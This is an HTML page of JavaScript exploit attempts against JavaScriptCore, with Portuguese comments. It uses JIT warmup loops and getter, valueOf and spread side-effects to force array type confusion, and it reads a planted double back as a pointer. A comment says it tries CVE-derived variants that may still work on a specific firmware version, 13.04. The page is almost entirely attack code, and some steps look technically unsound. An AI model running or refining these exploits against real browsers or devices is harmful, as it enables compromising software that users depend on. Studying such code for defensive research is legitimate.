<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>TEST 08 - JSC Type Confusion</title>
</head>
<body>

<h2>TEST 08 - JavaScriptCore Type Confusion</h2>
<p>Alvo: crash / type confusion em JavaScriptCore via manipulacao de prototype e arrays</p>
<p>API: Array, Object.defineProperty, Proxy (se disponivel), prototype chain</p>
<p>Tecnica: JIT warmup + side-effect inesperado no caminho otimizado</p>

<pre id="log">Aguardando inicio...</pre>
<button onclick="testProtoConfusion()">PROTO CONFUSION</button>
<button onclick="testJITTrap()">JIT WARMUP TRAP</button>
<button onclick="testArrayTypeShift()">ARRAY TYPE SHIFT</button>
<button onclick="testGetterRace()">GETTER SIDE-EFFECT</button>

<script>
var log = document.getElementById('log');

function append(msg) {
  log.textContent += '\n' + msg;
}

function testProtoConfusion() {
  append('[08] Teste: prototype chain confusion...');

  try {
    // Baseado no pattern do CVE (type confusion via Base extends Function)
    // Testando variantes que possam ainda funcionar no FW 13.04

    var victim = [1.1, 2.2, 3.3, 4.4];

    // Definir getter com side-effect no prototype de Array
    var original_proto = Array.prototype;

    function maliciousGetter() {
      // Side-effect: mudar tipo do victim durante iteracao
      victim[0] = {}; // Muda de double array para object array (JSC: ArrayWithDoubles -> ArrayWithContiguous)
      return 42;
    }

    // Instalar getter em position 0 de um array separado
    var trap_arr = [1.1, 2.2, 3.3];
    Object.defineProperty(trap_arr, 0, {
      get: maliciousGetter,
      configurable: true
    });

    // Funcao que sera JIT-compilada assumindo tipos estaveis
    function optimized_fn(flag) {
      victim[0] = 13.37;
      victim[1] = 13.37;
      if (flag) {
        // Spread que acessa trap_arr e dispara getter com side-effect
        var copy = [...trap_arr];
        return copy;
      }
      victim[1] = 3.54484805889626e-310; // magic double value
      return victim[1];
    }

    // Fase de warmup - JIT compila assumindo victim e double array
    append('[08] Warmup JIT: 100k iteracoes sem flag...');
    for (var i = 0; i < 100000; i++) {
      optimized_fn(false);
    }
    append('[08] Warmup completo. Disparando com flag=true...');

    // Disparo - JIT assume tipos antigos, mas getter muda tipo de victim
    var result = optimized_fn(true);
    append('[08] Resultado: ' + result);
    append('[08] victim[0] apos: ' + victim[0] + ' | tipo: ' + (typeof victim[0]));
    append('[08] victim[1] apos: ' + victim[1]);

    // Tentar interpretar victim[1] como ponteiro (float que representa um endereco)
    var float_view = new Float64Array(1);
    float_view[0] = typeof victim[1] === 'number' ? victim[1] : 0;
    var int_view = new Uint32Array(float_view.buffer);
    append('[08] victim[1] como int32: 0x' + int_view[1].toString(16) + int_view[0].toString(16));

  } catch(e) {
    append('[08] Proto confusion EXCECAO: ' + e.message);
  }
}

function testJITTrap() {
  append('[08] JIT warmup trap: polimorfismo forcado apos especializacao...');

  try {
    // Funcao que opera em arrays de doubles
    function sum_doubles(arr) {
      var s = 0.0;
      for (var i = 0; i < arr.length; i++) {
        s += arr[i]; // JIT especializa para ArrayWithDoubles
      }
      return s;
    }

    var pure_double = [1.1, 2.2, 3.3, 4.4, 5.5];

    // Warmup com array de doubles
    append('[08] Warmup sum_doubles...');
    for (var i = 0; i < 50000; i++) {
      sum_doubles(pure_double);
    }
    append('[08] Warmup OK. Injetando object array...');

    // Chamada com array que contem objeto - JIT assume double, recebe objeto
    var mixed = [1.1, 2.2, {toString: function() { return 99.9; }}, 4.4];
    var r1 = sum_doubles(mixed);
    append('[08] sum_doubles(mixed): ' + r1);

    // Caso mais agressivo: array com propriedade length modificavel
    var tricky = [1.0, 2.0, 3.0];
    var calls = 0;
    Object.defineProperty(tricky, 'length', {
      get: function() {
        calls++;
        if (calls > 100000) {
          // Alterar durante iteracao JIT-compilada
          tricky[0] = {};
          tricky[1] = {};
        }
        return 3;
      }
    });

    var r2 = 0;
    for (var j = 0; j < 200000; j++) {
      r2 += sum_doubles(tricky);
    }
    append('[08] tricky sum: ' + r2 + ' | length getter calls: ' + calls);

  } catch(e) {
    append('[08] JIT trap EXCECAO: ' + e.message);
  }
}

function testArrayTypeShift() {
  append('[08] Array type shift: forcando transicao de tipo em array JSC...');

  try {
    // Em JSC, arrays passam por diferentes "butterfly" types:
    // ArrayWithInt32 -> ArrayWithDouble -> ArrayWithContiguous -> ArrayWithSlowPutArrayStorage
    // Forcando transicoes em cascata pode causar UAF em versoes antigas

    var arr = new Array(1000);

    // Inicializar como int32 array
    for (var i = 0; i < 1000; i++) arr[i] = i;
    append('[08] Array int32: arr[0]=' + arr[0]);

    // Transicao para double
    arr[0] = 1.5;
    append('[08] Array double: arr[0]=' + arr[0]);

    // Transicao para contiguous (object)
    arr[0] = {};
    append('[08] Array object: arr[0]=' + typeof arr[0]);

    // Transicao para slow put (array storage com holes)
    arr[99999] = 42; // Indice fora do range atual
    append('[08] Array slow: arr[99999]=' + arr[99999] + ' | arr.length=' + arr.length);

    // Agora usar como array de doubles em funcao JIT-compilada
    function readDouble(a, idx) {
      return a[idx] + 1.0; // JIT pode assumir double
    }

    for (var j = 0; j < 100000; j++) readDouble(arr, 500);
    var r = readDouble(arr, 0); // arr[0] e um objeto, nao double!
    append('[08] readDouble(arr, 0) onde arr[0] e object: ' + r);

  } catch(e) {
    append('[08] Array type shift EXCECAO: ' + e.message);
  }
}

function testGetterRace() {
  append('[08] Getter side-effect durante operacoes de array otimizadas...');

  try {
    var shared = [1.1, 2.2, 3.3];

    // Getter que modifica array compartilhado como side-effect
    var accessCount = 0;
    var trigger = {
      valueOf: function() {
        accessCount++;
        if (accessCount === 50001) {
          // Mudar tipo de shared exatamente quando JIT ja especializou
          shared.push({corrupted: true});
          shared[0] = "now_a_string";
        }
        return 1.0;
      }
    };

    function hotPath(x) {
      return shared[0] + x; // JIT especializa para shared[0] como double
    }

    // Warmup
    for (var i = 0; i < 50000; i++) hotPath(trigger);
    append('[08] Warmup getter race: ' + accessCount + ' acessos');

    // Disparo com tipo alterado
    var result = hotPath(trigger);
    append('[08] hotPath apos corrupcao: ' + result);
    append('[08] shared[0] atual: ' + shared[0] + ' | tipo: ' + typeof shared[0]);
    append('[08] shared.length: ' + shared.length);

  } catch(e) {
    append('[08] Getter race EXCECAO: ' + e.message);
  }
}
</script>

</body>
</html>
